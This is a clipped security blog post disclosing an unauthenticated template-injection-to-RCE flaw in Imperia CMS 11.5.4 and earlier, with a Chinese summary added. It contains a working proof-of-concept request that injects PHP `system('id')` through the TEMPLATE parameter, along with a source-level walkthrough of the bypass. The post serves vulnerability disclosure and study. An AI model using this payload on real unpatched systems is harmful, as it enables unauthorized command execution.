---
title: Imperia CMS &lt;= 11.5.4 SiteActive TEMPLATE … | RCE Security
source: https://www.rcesecurity.com/2026/10/imperia-cms-siteactive-template-unauthenticated-ssti-rce-cve-2026-110355/
source_host: www.rcesecurity.com
clip_date: 2026-10-20T17:29:58+08:00
trace_id: f10a4d03-ede7-4fae-a3df-2960d2db8e8d
content_hash: f9bd4c80a88278b643f00fb204bfcdcd3d94a6519026e62c37440e94d73c24eb
status: synced
tags:
  - 漏洞分析
  - Web安全
series: null
feed_source: RCE Security·漏洞研究
ai_summary: Imperia CMS ≤11.5.4 的 `/cgi-bin/site_active.pl` 存在未授权模板注入，攻击者可借 `TEMPLATE` 参数把 PHP 代码注入页面，再经 `PHPExec` 转换插件执行系统命令。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 3ff75244-d011-8178-9763-f49fa1880bcf
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Imperia CMS ≤11.5.4 的 `/cgi-bin/site_active.pl` 存在未授权模板注入，攻击者可借 `TEMPLATE` 参数把 PHP 代码注入页面，再经 `PHPExec` 转换插件执行系统命令。
> 
> - **前置条件：** 仅 CGI 模式安装且 SiteActive HTTP 访问开启（`DEACTIVATE-SITEACTIVE-HTTP` 未设为 `1/Y/ON`）时暴露；命令执行还需服务器上有可用的 PHP 二进制文件。
> - **过滤缺陷：** 入口未鉴权即把请求参数交给 `SiteActive->process`；清洗逻辑只删除开头的 `/`、CGI-BIN 路径、`../` 与 `#`，引号、括号、花括号、`%`、尖括号均原样保留。
> - **绕过校验：** payload 以 `{SITE_ACTIVE}` 前缀使 `in_docroot=0`，从而完全跳过 `is_safe_docname` 检查；余下内容不含斜杠，`is_inside` 路径校验也不触发。
> - **注入手法：** 视图解析器把文件名拼进 `{% ##include ('$what')%}`，用 `X')%}` 提前闭合 include，使 `<?php system('id');?>` 成为页面正文；末尾的 `{%##y('` 用于吸收解析器追加的 `')%}`。
> - **执行链：** 渲染后 `Imperia::Template::Convert` 扫描 `<!--postconvert:PHPExec()-->` 注释生成任务并分发到 `PHPExec.pm`，以 `"$cmd |"` 打开管道处理页面内 PHP，完成 RCE；厂商已在 11.8.0 修复。

## A Template Name to Rule Them All

[Imperia CMS](https://www.pirobase-imperia.com/produkte/imperia-cms) is an ISO 27001-certified enterprise content management system used by a variety of organizations including the Bavarian police. During a customer penetration test, we encountered an Imperia CMS instance and began investigating whether it could provide a path into the customer’s environment. Turned out: it is.

On affected CGI-enabled installations running version 11.5.4 or below, an unauthenticated request to `/cgi-bin/site_active.pl` can turn the `TEMPLATE` parameter into server-side template injection and, with PHP available, command execution.

A proof-of-concept request looks like this:

```http
GET /cgi-bin/site_active.pl?TEMPLATE={SITE_ACTIVE}X')%25}<%3fphp+system('id')%3b%3f><!--postconvert%3aPHPExec()-->{%25%23%23y(' HTTP/1.1
Host: <target>
```

The decoded payload:

```text
{SITE_ACTIVE}X')%}<?php system('id');?><!--postconvert:PHPExec()-->{%##y('
```

Let’s take this apart, and see how the postconverter turns page content into arbitrary code execution.

## First: Select the SiteActive View Path

The CGI entry point accepts request parameters without authentication and passes them to `Imperia::SiteActive->process` when `DEACTIVATE-SITEACTIVE-HTTP` is unset or off:

```perl
# cgi-bin/site_active.pl:32-40
if (defined $imperia->common->{system_conf}->{'DEACTIVATE-SITEACTIVE-HTTP'}
    && $imperia->common->{system_conf}->{'DEACTIVATE-SITEACTIVE-HTTP'} =~ m{1|Y|ON}xmsi) {
    warn  "Warning: SiteActive is deactivated by the system variable "
        . "DEACTIVATE-SITEACTIVE-HTTP.\n";
    exit;
}

my %form = %{$imperia->common->{params}};
my $result = $siteActive->process (\%form);
```

The request sanitizer removes leading slashes, the configured CGI-BIN path, `../`, and `#`. It leaves the quote, parentheses, braces, percent sign, and angle brackets needed by the payload untouched:

```perl
# Imperia/SiteActive.pm:146-153
my %secureForm;
if ($imperia->inHTTPRequest) {
    while (my ($key, $value) = each %$form) {
        $key =~ s!^/|$system_conf->{'CGI-BIN'}|\.\./!!g;
        $key =~ tr/\#//d;
        $value =~ s!^/|$system_conf->{'CGI-BIN'}|\.\./!!g;
        $value =~ tr/\#//d;
        $secureForm{$key} = $value;
    }
}
```

This is why the payload starts with `{SITE_ACTIVE}`. SiteActive removes that prefix, selects its view directory, and sets `in_docroot` to 0. This actually bypasses the `is_safe_docname` check which only kicks in when `in_docroot` is set to 1:

```perl
# Imperia/SiteActive.pm:165-198
my $template_file = $secureForm{'TEMPLATE'};
...
} elsif ($template_file =~ s/^\{SITE[-_]ACTIVE}//) {
    $basepath = $system_conf->{'SITE-DIR'} . '/active/default';
    $in_docroot = 0;
    $is_view_template = 1;
} else {
    $basepath = $system_conf->{'DOCUMENT-ROOT'};
    $in_docroot = 1;
}

my $absTemplate = "$basepath/$template_file";
if ($in_docroot && ! -e  $absTemplate ) {
    warn "Error : Template file $absTemplate not found.\n";
    return;
}

if ($in_docroot) {
    unless (is_safe_docname ($template_file => '')) {
        warn "Error: Tainted template $template_file.";
        return;
    }
}
```

Since the remaining payload has no slash, the later `is_inside` path check does not stop it either. SiteActive then passes the filename to the view parser:

```perl
# Imperia/SiteActive.pm:250-258
unless (is_inside "$basepath/$template_file", $secure_cage) {
    warn "Error: Tainted template $basepath/$template_file.";
    return;
}
push @view_dirs, $basepath;

$parser->setDirectories(@view_dirs);
$parser->unshiftImportRealm('SiteActive');
my $view = $parser->parse($template_file);
```

## Next: Escape the Generated Include

The view parser does not open the supplied name directly, which wouldn’t work - obviously. It first inserts the filename into a single-quoted template include directive:

```perl
# Imperia/View/Parser.pm:411-414
unless (ref $what) {
    # Filename.  Turn it into a template.
    my $code = qq[{\% ##include ('$what')\%}];
    $what = \$code;
}
```

Once SiteActive has removed `{SITE_ACTIVE}`, the parser inserts the rest of the payload where `$what` appears above. `X')%}` completes the generated include as `{% ##include ('X')%}`. That puts the PHP code and the `postconvert` comment outside the include, where they become page content.

The parser still appends its own `')%}` after the supplied value. The payload ends with `{%##y('` to take up those characters as a second directive. SiteActive’s sanitizer has already removed the two attacker-supplied `#` characters, so the generated template source has this overall shape:

```text
{% ##include ('X')%}<?php system('id');?><!--postconvert:PHPExec()-->{%y('')%}
```

The inserted PHP is page content at this point. The next stage makes it executable.

## Pwnage: Turn Page Content Into a Converter Job

After rendering, SiteActive runs the conversion pipeline on `$page`:

```perl
# Imperia/SiteActive.pm:294-298
my $virt_template = Imperia::Template->new(
    dynamic => $dynamic, data => '');

Imperia::Template::Convert->new()->convert(
    \$page, $params, $virt_template);
```

`Imperia::Template::Convert` scans the page for `<!--postconvert:PLUGIN(args)-->` comments, turns them into jobs, and dispatches each by plugin name. That is the job of `<!--postconvert:PHPExec()-->` immediately after the injected PHP:

```perl
# Imperia/Template/Convert.pm:25-27,40-50
my $tag = $params->{converttag};
$tag = 'postconvert' unless $tag;
$$dataref =~ s/<!--$tag(?::([:\w]+)\s*(?:\(([^>]*)\)|)\s*)?-->/&addJob($self,$1,$2)/eg;
...
foreach my $job ( @{$self->{JOBS}} ) {
    my ($plugin, $string) = @{$job};
    ...
    my $dynamic = $self->{dispatcher}->create($plugin, 'new', { params => $params,
                                                                templates => $template })
        or die $self->{dispatcher}->errorSuck;

    $dynamic->try('convert', $dataref, $string)
        or die $dynamic->errorSuck;
}
```

`Dynamic/Convert/PHPExec.pm` then opens a pipe to the configured PHP command, which processes the injected PHP in the page:

```perl
# Dynamic/Convert/PHPExec.pm:101-107
my $end_of_headers;
local *CMD;

unless (open CMD, "$cmd |") {
    warn "cannot execute $cmd: $!";
    die "cannot execute $cmd: $!\n";
}
```

That’s ultimately how code is executed:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4bfa1c804597e920.png)

## Fix

The vendor addressed the reported vulnerability in [Imperia CMS 11.8.0](https://portal.pirobase-imperia.com/pb/imperia/releases/imperia-1180). According to the vendor, `/cgi-bin/site_active.pl` is exposed only on CGI-enabled installations where SiteActive HTTP access is enabled. This payload also requires an available PHP binary for `PHPExec`. Other converter paths may exist, but this proof of concept establishes the PHPExec chain. Several of our customers run the required configuration.

Overall, the team behind imperia CMS was great to work with throughout the disclosure process and responded quickly with a fix, and even provided a test instance so that we could verify the finding. Great job!
